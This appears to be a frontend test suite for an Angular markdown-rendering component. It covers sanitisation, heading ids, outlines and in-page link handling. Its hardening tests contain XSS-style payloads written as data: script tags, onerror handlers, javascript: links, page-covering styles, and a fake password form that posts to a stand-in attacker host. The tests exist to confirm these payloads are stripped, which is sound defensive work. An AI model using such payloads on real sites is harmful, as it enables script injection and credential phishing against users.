import { ErrorHandler } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import DOMPurify from 'dompurify';
import { marked } from 'marked';
import { Router } from '@angular/router';
import { decodeFragment, makeScrollableBlocksFocusable, MarkdownOutlineEntry, MarkdownView } from './markdown-view';

describe('MarkdownView', () => {
  function render(content: string, headingOffset?: number) {
    const fixture = TestBed.createComponent(MarkdownView);
    fixture.componentRef.setInput('content', content);
    if (headingOffset !== undefined) {
      fixture.componentRef.setInput('headingOffset', headingOffset);
    }
    fixture.detectChanges();
    return fixture.nativeElement as HTMLElement;
  }

  it('renders basic markdown as HTML', () => {
    const el = render('# Title\n\nSome **bold** text.');
    expect(el.querySelector('h1')?.textContent).toBe('Title');
    expect(el.querySelector('strong')?.textContent).toBe('bold');
  });

  it('strips a raw script tag rather than rendering it', () => {
    const el = render('Hello <script>window.pwned = true;</script> world');
    expect(el.querySelector('script')).toBeNull();
    expect((window as unknown as { pwned?: boolean }).pwned).toBeUndefined();
  });

  it('strips an inline event handler attribute', () => {
    const el = render('<img src="x" onerror="window.pwned2=true">');
    const img = el.querySelector('img');
    expect(img?.getAttribute('onerror')).toBeNull();
  });

  it('strips a javascript: link target', () => {
    const el = render('<a href="javascript:alert(1)">clic</a> [aussi](javascript:alert(2))');
    for (const a of Array.from(el.querySelectorAll('a'))) {
      expect(a.getAttribute('href') ?? '').not.toContain('javascript:');
    }
  });

  describe('hardening', () => {
    it('drops a <style> element and its rules', () => {
      const el = render('<style>body{display:none}</style>\n\nTexte');
      expect(el.querySelector('style')).toBeNull();
      expect(el.textContent).not.toContain('display:none');
      expect(el.textContent).toContain('Texte');
    });

    it('drops a <style> element hidden inside an <svg>', () => {
      const el = render('<svg><style>body{display:none}</style><circle r="4"></circle></svg>');
      expect(el.querySelector('style')).toBeNull();
      expect(el.textContent).not.toContain('display:none');
    });

    it('drops inline style attributes (no full-page overlay)', () => {
      const el = render('<div style="position:fixed;inset:0;z-index:9999">Overlay</div>\n\n<span style="color:red">rouge</span>');
      expect(el.querySelector('[style]')).toBeNull();
      expect(el.textContent).toContain('Overlay');
    });

    it('drops a fake login form: the form, the password field and the button', () => {
      const el = render(
        '<form action="https://evil.example/steal"><input type="password" name="pw"><input type="text"><input><button>Se reconnecter</button></form>',
      );
      expect(el.querySelector('form')).toBeNull();
      expect(el.querySelector('input')).toBeNull();
      expect(el.querySelector('button')).toBeNull();
      expect(el.innerHTML).not.toContain('evil.example');
    });

    it('drops the other form controls and dialogs', () => {
      const el = render('<textarea>a</textarea><select><optgroup><option>b</option></optgroup></select><fieldset>c</fieldset><dialog open>d</dialog>');
      for (const tag of ['textarea', 'select', 'option', 'optgroup', 'fieldset', 'dialog']) {
        expect(el.querySelector(tag), tag).toBeNull();
      }
    });

    it('drops popover attributes', () => {
      const el = render('<div popover id="pop">Surprise</div>\n\n<a popovertarget="pop" popovertargetaction="show">ouvrir</a>');
      expect(el.querySelector('[popover]')).toBeNull();
      expect(el.querySelector('[popovertarget]')).toBeNull();
      expect(el.querySelector('[popovertargetaction]')).toBeNull();
    });

    it('prefixes author ids and names so they cannot collide with the page\'s own ids', () => {
      const el = render('<div id="mr-diff-heading">Titre</div>\n\n<a name="top">ancre</a>');
      expect(el.querySelector('#mr-diff-heading')).toBeNull();
      expect(el.querySelector('.markdown-view div')?.id).toBe('user-content-mr-diff-heading');
      expect(el.querySelector('a')?.getAttribute('name')).toBe('user-content-top');
    });

    it('keeps GFM task-list checkboxes, checked state intact but disabled', () => {
      const el = render('- [x] fait\n- [ ] à faire');
      const boxes = Array.from(el.querySelectorAll<HTMLInputElement>('input'));
      expect(boxes.length).toBe(2);
      expect(boxes.map((b) => b.type)).toEqual(['checkbox', 'checkbox']);
      expect(boxes.map((b) => b.checked)).toEqual([true, false]);
      expect(boxes.every((b) => b.disabled)).toBe(true);
    });

    it('disables a raw HTML checkbox too', () => {
      const el = render('<input type="checkbox" checked> raw');
      const box = el.querySelector<HTMLInputElement>('input');
      expect(box?.type).toBe('checkbox');
      expect(box?.disabled).toBe(true);
    });

    it('keeps remote images, without a referrer and loaded lazily', () => {
      const el = render('![logo](https://example.com/logo.png)');
      const img = el.querySelector('img')!;
      expect(img.getAttribute('src')).toBe('https://example.com/logo.png');
      expect(img.getAttribute('referrerpolicy')).toBe('no-referrer');
      expect(img.getAttribute('loading')).toBe('lazy');
    });

    it('keeps what READMEs, wikis and release notes use: align, image width, details, code language classes', () => {
      const el = render(
        '<p align="center"><img src="https://example.com/a.png" width="120"></p>\n\n<details><summary>Plus</summary>\n\nCaché\n\n</details>\n\n```ts\nconst a = 1;\n```',
      );
      expect(el.querySelector('p')?.getAttribute('align')).toBe('center');
      expect(el.querySelector('img')?.getAttribute('width')).toBe('120');
      expect(el.querySelector('details summary')?.textContent).toBe('Plus');
      expect(el.querySelector('pre code')?.classList).toContain('language-ts');
    });

    it('strips app CSS classes an author could use to spoof the UI', () => {
      const el = render('<span class="sr-only">caché</span> <a class="skip-link" href="#x">passer</a> <p class="gbt-form-error">Erreur</p>');
      expect(el.querySelector('.markdown-view [class]')).toBeNull();
      expect(el.textContent).toContain('caché');
    });

    it('keeps only language-* classes among several', () => {
      const el = render('<pre><code class="language-ts other sr-only">x</code></pre>');
      expect(el.querySelector('code')?.getAttribute('class')).toBe('language-ts');
    });

    it('keeps language classes with symbols such as c++', () => {
      const el = render('```c++\nint a;\n```');
      expect(el.querySelector('pre code')?.classList).toContain('language-c++');
    });

    it('drops the for attribute, so a label cannot toggle a control of the page', () => {
      const el = render('<label for="gbt-switch-3">Basculer</label>');
      expect(el.querySelector('label')?.hasAttribute('for')).toBe(false);
      expect(el.textContent).toContain('Basculer');
    });

    it('drops tabindex and aria IDREF attributes', () => {
      const el = render(
        '<section tabindex="1" aria-owns="a" aria-controls="b" aria-labelledby="c" aria-describedby="d" aria-label="ok">x</section>',
      );
      const div = el.querySelector('section')!;
      expect(div.getAttribute('aria-label')).toBe('ok');
      for (const attr of ['tabindex', 'aria-owns', 'aria-controls', 'aria-labelledby', 'aria-describedby']) {
        expect(div.hasAttribute(attr), attr).toBe(false);
      }
    });

    it('leaves the global DOMPurify instance alone (code-view uses it)', () => {
      render('<style>x{}</style>');
      expect(DOMPurify.sanitize('<input type="text"><span style="color:red">x</span>')).toBe('<input type="text"><span style="color:red">x</span>');
    });
  });

  describe('headingOffset', () => {
    it('keeps the markdown heading levels by default', () => {
      const el = render('# Un\n\n## Deux');
      expect(el.querySelector('h1')?.textContent).toBe('Un');
      expect(el.querySelector('h2')?.textContent).toBe('Deux');
    });

    it('shifts every heading down by the offset, capped at h6', () => {
      const el = render('# Un\n\n## Deux\n\n##### Cinq\n\n###### Six', 2);
      expect(el.querySelector('h1')).toBeNull();
      expect(el.querySelector('h2')).toBeNull();
      expect(el.querySelector('h3')?.textContent).toBe('Un');
      expect(el.querySelector('h4')?.textContent).toBe('Deux');
      expect(Array.from(el.querySelectorAll('h6')).map((h) => h.textContent)).toEqual(['Cinq', 'Six']);
    });

    it('does not leak into other markdown renders', () => {
      render('# Décalé', 2);
      expect(render('# Normal').querySelector('h1')?.textContent).toBe('Normal');
      expect(marked.parse('# Direct', { async: false })).toContain('<h1>Direct</h1>');
    });
  });

  describe('outline and heading ids', () => {
    function renderWithOutline(content: string, headingOffset?: number) {
      const fixture = TestBed.createComponent(MarkdownView);
      const emitted: MarkdownOutlineEntry[][] = [];
      fixture.componentInstance.outline.subscribe((entries) => emitted.push(entries));
      fixture.componentRef.setInput('content', content);
      if (headingOffset !== undefined) {
        fixture.componentRef.setInput('headingOffset', headingOffset);
      }
      fixture.detectChanges();
      return { fixture, el: fixture.nativeElement as HTMLElement, emitted, last: () => emitted[emitted.length - 1] };
    }

    it('emits the h2–h4 headings in document order, with their text and id', () => {
      const { last } = renderWithOutline('# FerrisGit\n\n## Installation\n\n### Prérequis\n\n#### Linux\n\n##### Détail\n\n## Utilisation');

      expect(last()).toEqual([
        { level: 2, text: 'Installation', id: 'user-content-installation' },
        { level: 3, text: 'Prérequis', id: 'user-content-prérequis' },
        { level: 4, text: 'Linux', id: 'user-content-linux' },
        { level: 2, text: 'Utilisation', id: 'user-content-utilisation' },
      ]);
    });

    it('gives every rendered h1–h4 its slug id on the DOM (h5/h6 keep none)', () => {
      const { el } = renderWithOutline('# FerrisGit\n\n## Installation\n\n#### Linux\n\n##### Détail');

      expect(el.querySelector('h1')?.id).toBe('user-content-ferrisgit');
      expect(el.querySelector('h2')?.id).toBe('user-content-installation');
      expect(el.querySelector('h4')?.id).toBe('user-content-linux');
      expect(el.querySelector('h5')?.hasAttribute('id')).toBe(false);
      expect(el.querySelector('#user-content-installation')?.textContent).toBe('Installation');
    });

    it('slugs like GitHub: lower case, accents kept, punctuation dropped, spaces as single hyphens', () => {
      const { last } = renderWithOutline('## Démarrage rapide : v1.2 !\n\n## Le module `gix` (lecture)\n\n## 🚀 !!!');

      expect(last().map((entry) => entry.id)).toEqual([
        'user-content-démarrage-rapide-v12',
        'user-content-le-module-gix-lecture',
        'user-content-section',
      ]);
      expect(last()[1].text).toBe('Le module gix (lecture)');
    });

    it('de-duplicates repeated titles with -2, -3…', () => {
      const { el, last } = renderWithOutline('## Exemple\n\n## Exemple\n\n### Exemple\n\n## Exemple 2');

      expect(last().map((entry) => entry.id)).toEqual([
        'user-content-exemple',
        'user-content-exemple-2',
        'user-content-exemple-3',
        'user-content-exemple-2-2',
      ]);
      const ids = Array.from(el.querySelectorAll('[id]')).map((node) => node.id);
      expect(new Set(ids).size).toBe(ids.length);
    });

    it('ignores "headings" inside code, and leaves quoted or folded headings out of the outline', () => {
      const { el, last } = renderWithOutline(
        '## Vrai titre\n\n```md\n## Pas un titre\n```\n\n    ## Indenté\n\n> ## Citation\n\n<details><summary>Plus</summary>\n\n## Replié\n\n</details>',
      );

      expect(last()).toEqual([{ level: 2, text: 'Vrai titre', id: 'user-content-vrai-titre' }]);
      expect(el.querySelector('blockquote h2')?.id).toBe('user-content-citation');
      expect(el.querySelector('details h2')?.id).toBe('user-content-replié');
    });

    it('sets the ids after sanitising: an author id on a heading cannot override them', () => {
      const { el, last } = renderWithOutline('<h2 id="x">Titre</h2>\n\n<h3 id="mr-diff-heading">Autre</h3>');

      expect(el.querySelector('h2')?.id).toBe('user-content-titre');
      expect(el.querySelector('h3')?.id).toBe('user-content-autre');
      expect(el.querySelector('#user-content-x')).toBeNull();
      expect(el.querySelector('#mr-diff-heading')).toBeNull();
      expect(last().map((entry) => entry.id)).toEqual(['user-content-titre', 'user-content-autre']);
    });

    it('keeps heading ids unique when an author plants the same id elsewhere', () => {
      const { el } = renderWithOutline('<p id="installation">Leurre</p>\n\n## Installation');

      expect(el.querySelectorAll('#user-content-installation')).toHaveLength(1);
      expect(el.querySelector('#user-content-installation')?.tagName).toBe('H2');
      expect(el.querySelector('p')?.hasAttribute('id')).toBe(false);
    });

    it('takes the heading text as plain text (no markup reaches the outline)', () => {
      const { last } = renderWithOutline('## <img src=x onerror="window.pwned3=1">Sûr **gras**');

      expect(last()).toEqual([{ level: 2, text: 'Sûr gras', id: 'user-content-sûr-gras' }]);
      expect((window as unknown as { pwned3?: number }).pwned3).toBeUndefined();
    });

    it('reports the rendered levels when headingOffset shifts them', () => {
      const { el, last } = renderWithOutline('# Un\n\n## Deux\n\n### Trois\n\n#### Quatre', 1);

      expect(last()).toEqual([
        { level: 2, text: 'Un', id: 'user-content-un' },
        { level: 3, text: 'Deux', id: 'user-content-deux' },
        { level: 4, text: 'Trois', id: 'user-content-trois' },
      ]);
      expect(el.querySelector('h5')?.textContent).toBe('Quatre');
    });

    it('emits [] for empty content or content without headings', () => {
      expect(renderWithOutline('').last()).toEqual([]);
      expect(renderWithOutline('Juste un paragraphe.').last()).toEqual([]);
    });

    it('emits again after each render, and only then', () => {
      const { fixture, emitted, last } = renderWithOutline('## Avant');
      expect(emitted).toHaveLength(1);

      fixture.detectChanges();
      expect(emitted).toHaveLength(1);

      fixture.componentRef.setInput('content', '## Après\n\n### Suite');
      fixture.detectChanges();
      expect(emitted).toHaveLength(2);
      expect(last().map((entry) => entry.text)).toEqual(['Après', 'Suite']);
      expect((fixture.nativeElement as HTMLElement).querySelector('h2')?.id).toBe('user-content-après');
    });
  });

  // With `<base href="/">`, `[x](#installation)` would resolve against the site root and load the home page.
  describe('in-content anchor links', () => {
    let attached: HTMLElement | null = null;
    let savedMatchMedia: PropertyDescriptor | undefined;

    beforeEach(() => {
      savedMatchMedia = Object.getOwnPropertyDescriptor(window, 'matchMedia');
    });

    afterEach(() => {
      attached?.remove();
      attached = null;
      if (savedMatchMedia) {
        Object.defineProperty(window, 'matchMedia', savedMatchMedia);
      } else {
        delete (window as { matchMedia?: unknown }).matchMedia;
      }
    });

    function renderAttached(content: string) {
      const el = render(content);
      attached = el;
      document.body.appendChild(el);
      const spies = new Map<string, ReturnType<typeof vi.fn>>();
      for (const node of Array.from(el.querySelectorAll<HTMLElement>('[id], a[name]'))) {
        const spy = vi.fn();
        node.scrollIntoView = spy;
        spies.set(node.id || node.getAttribute('name')!, spy);
      }
      return { el, spies };
    }

    function click(el: HTMLElement, link: Element, init: MouseEventInit = {}) {
      let prevented = false;
      const record = (event: Event) => {
        prevented = event.defaultPrevented;
        event.preventDefault();
      };
      el.addEventListener('click', record);
      link.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, button: 0, ...init }));
      el.removeEventListener('click', record);
      return prevented;
    }

    const DOC = '[Installation](#installation) [Direct](#user-content-utilisation) [Nulle part](#absent)\n\n## Installation\n\nPas à pas.\n\n## Utilisation\n\nAu quotidien.';

    it('scrolls to the heading of a [x](#slug) link (id user-content-slug) and focuses it', () => {
      const { el, spies } = renderAttached(DOC);
      const heading = el.querySelector<HTMLElement>('#user-content-installation')!;

      const prevented = click(el, el.querySelector('a[href="#installation"]')!);

      expect(prevented).toBe(true);
      expect(spies.get('user-content-installation')).toHaveBeenCalledTimes(1);
      expect(spies.get('user-content-installation')).toHaveBeenCalledWith({ behavior: 'smooth', block: 'start' });
      expect(spies.get('user-content-utilisation')).not.toHaveBeenCalled();
      expect(heading.getAttribute('tabindex')).toBe('-1');
      expect(document.activeElement).toBe(heading);
    });

    it('also follows a link written with the full user-content- id', () => {
      const { el, spies } = renderAttached(DOC);

      expect(click(el, el.querySelector('a[href="#user-content-utilisation"]')!)).toBe(true);
      expect(spies.get('user-content-utilisation')).toHaveBeenCalledTimes(1);
    });

    it('decodes the fragment (accented slugs are percent-encoded in links)', () => {
      const { el, spies } = renderAttached('[Prérequis](#pr%C3%A9requis)\n\n## Prérequis');

      expect(click(el, el.querySelector('a')!)).toBe(true);
      expect(spies.get('user-content-prérequis')).toHaveBeenCalledTimes(1);
    });

    // dispatchEvent swallows a listener's error and Angular hands it to the ErrorHandler, so watch that and the scroll
    // instead of `not.toThrow()`.
    it('looks a malformed fragment up as written: no error, stays on the page, scrolls to the matching anchor', () => {
      const errorHandler = TestBed.inject(ErrorHandler);
      const handleError = vi.spyOn(errorHandler, 'handleError');
      const { el, spies } = renderAttached('[Cassé](#%E0%A4%A) [Titre](#titre)\n\n<a name="%E0%A4%A"></a>\n\n## Titre');
      expect(spies.has('user-content-%E0%A4%A')).toBe(true);

      expect(click(el, el.querySelector('a[href="#%E0%A4%A"]')!)).toBe(true);

      expect(handleError).not.toHaveBeenCalled();
      expect(spies.get('user-content-%E0%A4%A')).toHaveBeenCalledTimes(1);
      expect(spies.get('user-content-titre')).not.toHaveBeenCalled();

      expect(click(el, el.querySelector('a[href="#titre"]')!)).toBe(true);
      expect(spies.get('user-content-titre')).toHaveBeenCalledTimes(1);
      handleError.mockRestore();
    });

    it('does nothing (but still stays on the page) for an unknown target', () => {
      const { el, spies } = renderAttached(DOC);

      expect(click(el, el.querySelector('a[href="#absent"]')!)).toBe(true);
      for (const spy of spies.values()) {
        expect(spy).not.toHaveBeenCalled();
      }
    });

    it('jumps without animation when the reader prefers reduced motion', () => {
      Object.defineProperty(window, 'matchMedia', {
        configurable: true,
        writable: true,
        value: vi.fn((query: string) => ({ matches: query === '(prefers-reduced-motion: reduce)' })),
      });
      const { el, spies } = renderAttached(DOC);

      click(el, el.querySelector('a[href="#installation"]')!);

      expect(spies.get('user-content-installation')).toHaveBeenCalledWith({ behavior: 'auto', block: 'start' });
    });

    it('handles a click on markup inside the link too', () => {
      const { el, spies } = renderAttached('[**Installation**](#installation)\n\n## Installation');

      expect(click(el, el.querySelector('a strong')!)).toBe(true);
      expect(spies.get('user-content-installation')).toHaveBeenCalledTimes(1);
    });

    it('leaves ctrl/meta/shift-clicks and middle clicks to the browser (new tab, new window)', () => {
      const { el, spies } = renderAttached(DOC);
      const link = el.querySelector('a[href="#installation"]')!;

      expect(click(el, link, { ctrlKey: true })).toBe(false);
      expect(click(el, link, { metaKey: true })).toBe(false);
      expect(click(el, link, { shiftKey: true })).toBe(false);
      expect(click(el, link, { button: 1 })).toBe(false);
      expect(spies.get('user-content-installation')).not.toHaveBeenCalled();
    });

    it('leaves external and relative links alone', () => {
      const { el } = renderAttached('[Site](https://example.com/#installation) [Autre page](Autre-page) [Section](Autre-page#installation)\n\n## Installation');

      for (const link of Array.from(el.querySelectorAll('a'))) {
        expect(click(el, link), link.getAttribute('href')!).toBe(false);
      }
    });

    it('stops listening once destroyed (the listener is the template\'s own)', () => {
      const fixture = TestBed.createComponent(MarkdownView);
      fixture.componentRef.setInput('content', '[Installation](#installation)\n\n## Installation');
      fixture.detectChanges();
      const el = fixture.nativeElement as HTMLElement;
      attached = el;
      document.body.appendChild(el);
      const link = el.querySelector('a')!;
      fixture.destroy();

      expect(click(el, link)).toBe(false);
    });
  });
});

describe('MarkdownView routed links (opt-in)', () => {
  function render(content: string, prefix: string | null) {
    const navigateByUrl = vi.fn(() => Promise.resolve(true));
    TestBed.configureTestingModule({ providers: [{ provide: Router, useValue: { navigateByUrl } }] });
    const fixture = TestBed.createComponent(MarkdownView);
    fixture.componentRef.setInput('content', content);
    fixture.componentRef.setInput('routedLinkPrefix', prefix);
    fixture.detectChanges();
    const el = fixture.nativeElement as HTMLElement;
    // Record whether the view took the click, then keep jsdom from following the link.
    const click = (href: string, init: MouseEventInit = {}) => {
      let prevented = false;
      const record = (event: Event) => {
        prevented = event.defaultPrevented;
        event.preventDefault();
      };
      el.addEventListener('click', record);
      el.querySelector(`a[href="${href}"]`)!.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, button: 0, ...init }));
      el.removeEventListener('click', record);
      return prevented;
    };
    return { click, navigateByUrl };
  }

  const LINKS = '[ref](/docs/ci-cd/reference-yaml#variables) [accueil](/docs) [autre](/docsearch) [dépôt](/repositories/a/b) [site](https://example.com/docs/x)';

  it('sends a link under the prefix, fragment included, through the router', () => {
    const { click, navigateByUrl } = render(LINKS, '/docs');

    expect(click('/docs/ci-cd/reference-yaml#variables')).toBe(true);
    expect(click('/docs')).toBe(true);
    expect(navigateByUrl.mock.calls).toEqual([['/docs/ci-cd/reference-yaml#variables'], ['/docs']]);
  });

  it('leaves other paths, look-alike prefixes and external links to the browser', () => {
    const { click, navigateByUrl } = render(LINKS, '/docs');

    for (const href of ['/docsearch', '/repositories/a/b', 'https://example.com/docs/x']) {
      expect(click(href), href).toBe(false);
    }
    expect(navigateByUrl).not.toHaveBeenCalled();
  });

  it('leaves modified and middle clicks to the browser (new tab)', () => {
    const { click, navigateByUrl } = render(LINKS, '/docs');

    expect(click('/docs', { ctrlKey: true })).toBe(false);
    expect(click('/docs', { metaKey: true })).toBe(false);
    expect(click('/docs', { button: 1 })).toBe(false);
    expect(navigateByUrl).not.toHaveBeenCalled();
  });

  it('is off by default: a README link reloads as before', () => {
    const { click, navigateByUrl } = render(LINKS, null);

    expect(click('/docs/ci-cd/reference-yaml#variables')).toBe(false);
    expect(navigateByUrl).not.toHaveBeenCalled();
  });
});

describe('decodeFragment', () => {
  it('percent-decodes a fragment (accented slugs are encoded in links)', () => {
    expect(decodeFragment('pr%C3%A9requis')).toBe('prérequis');
    expect(decodeFragment('installation')).toBe('installation');
  });

  it('returns a malformed %-sequence as written instead of throwing', () => {
    expect(() => decodeFragment('%E0%A4%A')).not.toThrow();
    expect(decodeFragment('%E0%A4%A')).toBe('%E0%A4%A');
    expect(decodeFragment('100%')).toBe('100%');
  });
});

describe('makeScrollableBlocksFocusable', () => {
  it('lets the keyboard reach every code block and table, so a wide one can be scrolled sideways', () => {
    const container = document.createElement('div');
    container.innerHTML =
      '<p>Texte</p><pre><code>cargo build</code></pre><pre><code>cargo test</code></pre><table><tr><td>a</td></tr></table>';

    makeScrollableBlocksFocusable(container);

    const blocks = Array.from(container.querySelectorAll('pre'));
    expect(blocks.map((pre) => pre.getAttribute('tabindex'))).toEqual(['0', '0']);
    expect(blocks.map((pre) => pre.getAttribute('aria-label'))).toEqual(['Bloc de code', 'Bloc de code']);
    expect(container.querySelector('table')?.getAttribute('tabindex')).toBe('0');
    expect(container.querySelector('table')?.getAttribute('aria-label')).toBe('Tableau');
    expect(container.querySelector('p')?.hasAttribute('tabindex')).toBe(false);
  });
});
